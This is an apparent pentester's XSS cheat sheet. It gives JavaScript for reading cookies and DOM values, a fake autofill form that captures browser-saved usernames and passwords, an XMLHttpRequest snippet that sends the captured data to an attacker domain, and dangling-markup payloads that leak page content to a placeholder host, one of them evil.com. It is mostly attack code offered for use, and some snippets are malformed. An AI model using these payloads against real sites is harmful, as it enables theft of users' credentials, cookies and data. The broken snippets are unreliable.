# XSS
## Document Methods
**Always use setTimeout to 5000 before retrieving document data**
```javascript
document.getElementById('<ID>')
```

```javascript
var value;
var inputs = document.getElementsByTagName('<TAG>')`
var value = <LOGIC>
```

## Cookies (Non Http-Only)
`document.cookie`

## Credentials
**Only works for insecure browser keychains**
```html
<form id='creds' autocomplete='on'>
<input name="username" id="user" type="username" />
<input name="password" id="pw" type="password" />
</form>

<script>
var username = document.getElementById('user').value;
var pw = document.getElementById('pw').value;
</script>
```

## Retrieval
**Does not work if SOP is enabled**
```javascript
var req = new XMLHttpRequest();
req.open('<DOMAIN>', true);
body = String(<INFO>);
req.send(body);
```

## Dangling Markup
**Inject ' " \` /> or other closers to break final HTML**
**Source [here](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)**
### Sinks
**Tags all behave differently, for some reason**
- `<CLOSER> <img src="<DOMAIN>/?log=`
- `<CLOSER> <a href="<DOMAIN>/?log=`
- `<CLOSER> <meta http-equiv="refresh" content='0; url=http://<DOMAIN>/?text=`
- `<CLOSER<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=`